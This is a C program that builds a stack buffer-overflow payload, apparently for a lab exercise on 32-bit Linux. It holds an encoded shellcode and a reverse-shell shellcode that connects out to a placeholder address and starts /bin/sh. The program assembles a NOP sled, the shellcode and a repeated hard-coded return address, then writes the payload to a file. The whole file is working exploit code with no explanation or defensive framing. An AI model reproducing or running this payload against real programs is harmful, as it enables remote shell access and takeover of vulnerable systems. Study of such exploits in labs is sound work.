#include <stdio.h>
#include <string.h>
#define BUF_SIZE 1064
#define RET 0xbffff30c
char shellcode[] =
    "\xba\xcb\x5a\x58\x15\xdb\xde\xd9\x74\x24\xf4\x5f\x2b\xc9"
    "\xb1\x3d\x31\x57\x15\x83\xc7\x04\x03\x57\x11\xe2\x3e\x6b"
    "\x83\xe2\x23\xdf\x70\x5e\xc9\xe2\xff\x81\xbd\x85\x32\xc1"
    "\x2e\x10\x7d\xfd\x9d\x23\x34\x7b\xe4\x4c\x07\xd3\x3c\x02"
    "\xef\x26\x40\x0d\xac\xaf\xa1\x9d\x2a\xe0\x70\x8d\x01\x03"
    "\xfb\xd0\xab\x84\xa9\x7a\x59\xab\x3e\x13\xc9\x9c\xb7\x8c"
    "\x7b\x8b\x18\x27\x11\x3b\x0e\xb4\x81\x80\xee\x52\x3d\x85"
    "\x83\x8c\xa9\x04\x2b\xfe\x5e\xbf\xb3\x20\x8e\x4b\x2b\x4e"
    "\xb4\x93\x80\xf8\x14\xb7\xbe\x95\x3c\x19\x4d\x0e\x86\x0d"
    "\xc6\xa1\x8a\xa0\x40\x4a\x06\x4b\xbf\xda\xf5\xe4\x9f\x35"
    "\x6e\xd5\xac\x21\x4e\x41\x25\xdd\xfc\xfc\xa1\x40\x68\x91"
    "\x1e\xeb\x0e\x1e\x4f\x86\xa6\xcf\xe7\x3d\x56\x78\x85\xd8"
    "\xfe\x0b\x01\x6d\xab\xbf\xfe\x19\x61\x71\x2e\x9b\xed\x42"
    "\x1e\x35\xbe\xcc\x71\x07\x6a\x3f\xe5\xc1\xdb\x71\xbd\x85"
    "\x9e\xcc\x7e\x1e\x49\x86\xce\xd9\xd9\x70\xe1\xb6\x89\xd2"
    "\x95\x16\x49\xbc\x08\x0f\xf9\x27\xbc\xbb\x69\xda\x23\x2b"
    "\x04\x72\xc1\xc6\xab\xe7\x6d\x40\x38\x80\x18\xfa\xa1\x27"
    "\xcc\x9d\x49\xf2\x3f\x4d\xf8\x6a\x4b\xe5\x8c\x19\xdb\x60"
    "\x19\xfe\x73\x03\xce\xd1\xf4\xb4\x99\xcd\xa8\x69\x13\xf0"
    "\xfc\x85\xee\x73";
char shellcode2[] = "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
                    "\x06\x51\xb1\x01\x51\xb1\x02\x51"
                    "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
                    "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
                    "\x68\x41\x42\x43\x44\x66\x68\xb0"
                    "\xef\xb1\x02\x66\x51\x89\xe7\xb3"
                    "\x10\x53\x57\x52\x89\xe1\xb3\x03"
                    "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
                    "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
                    "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
                    "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
                    "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
                    "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
                    "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
                    "\x2f\x62\x69\x89\xe3\x50\x53\x89"
                    "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
                    "\x01\xcd\x80";
char shellcode3[] = "\xba\xcb\x5a\x58\x15\xdb\xde\xd9\x74\x24\xf4"
                    "\x5f\x2b\xc9\xb1\x3d\x31\x57\x15\x83\xc7\x04\x03\x57\x11\xe2\x3e"
                    "\x6b\x83\xe2\x23\xdf\x70\x5e\xc9\xe2\xff\x81\xbd\x85\x32\xc1\x2e"
                    "\x10\x7d\xfd\x9d\x23\x34\x7b\xe4\x4c\x07\xd3\x3c\x02\xef\x26\x40"
                    "\x0d\xac\xaf\xa1\x9d\x2a\xe0\x70\x8d\x01\x03\xfb\xd0\xab\x84\xa9"
                    "\x7a\x59\xab\x3e\x13\xc9\x9c\xb7\x8c\x7b\x8b\x18\x27\x11\x3b\x0e"
                    "\xb4\x81\x80\xee\x52\x3d\x85\x83\x8c\xa9\x04\x2b\xfe\x5e\xbf\xb3"
                    "\x20\x8e\x4b\x2b\x4e\xb4\x93\x80\xf8\x14\xb7\xbe\x95\x3c\x19\x4d"
                    "\x0e\x86\x0d\xc6\xa1\x8a\xa0\x40\x4a\x06\x4b\xbf\xda\xf5\xe4\x9f"
                    "\x35\x6e\xd5\xac\x21\x4e\x41\x25\xdd\xfc\xfc\xa1\x40\x68\x91\x1e"
                    "\xeb\x0e\x1e\x4f\x86\xa6\xcf\xe7\x3d\x56\x78\x85\xd8\xfe\x0b\x01"
                    "\x6d\xab\xbf\xfe\x19\x61\x71\x2e\x9b\xed\x42\x1e\x35\xbe\xcc\x71"
                    "\x07\x6a\x3f\xe5\xc1\xdb\x71\xbd\x85\x9e\xcc\x7e\x1e\x49\x86\xce"
                    "\xd9\xd9\x70\xe1\xb6\x89\xd2\x95\x16\x49\xbc\x08\x0f\xf9\x27\xbc"
                    "\xbb\x69\xda\x23\x2b\x04\x72\xc1\xc6\xab\xe7\x6d\x40\x38\x80\x18"
                    "\xfa\xa1\x27\xcc\x9d\x49\xf2\x3f\x4d\xf8\x6a\x4b\xe5\x8c\x19\xdb"
                    "\x60\x19\xfe\x73\x03\xce\xd1\xf4\xb4\x99\xcd\xa8\x69\x13\xf0\xfc"
                    "\x85\xee\x73";
char buffer[BUF_SIZE];
int main(int argc, char *argv[])
{
    FILE *fp = fopen("buffer_output.txt", "w");
    if (fp == NULL)
    {
        perror("Failed to open output file");
        return 1;
    }
    int i;
    printf("Shellcode length: %d\n", (int)sizeof(shellcode));
    printf("Shellcode2 length: %d\n", (int)sizeof(shellcode2));
    // filling buffer with NOPs
    memset(buffer, 0x90, BUF_SIZE);
    memcpy(buffer + 500 - sizeof(shellcode), shellcode, sizeof(shellcode) - 1);
    // Copying the return address multiple times at the end of the buffer...
    for (i = 701; i < BUF_SIZE - 4; i += 4)
    {
        *((int *)&buffer[i]) = RET;
    }
    buffer[BUF_SIZE - 1] = 0x0;
    // Ghi ra file theo định dạng \xHH
    for (i = 0; i < BUF_SIZE; i++)
    {
        fprintf(fp, "\\x%02x", (unsigned char)buffer[i]);
        if ((i + 1) % 16 == 0)
            fprintf(fp, "\n");
    }

    fclose(fp);
    printf("Đã ghi buffer vào file buffer_output.txt\n");
    return 0;
}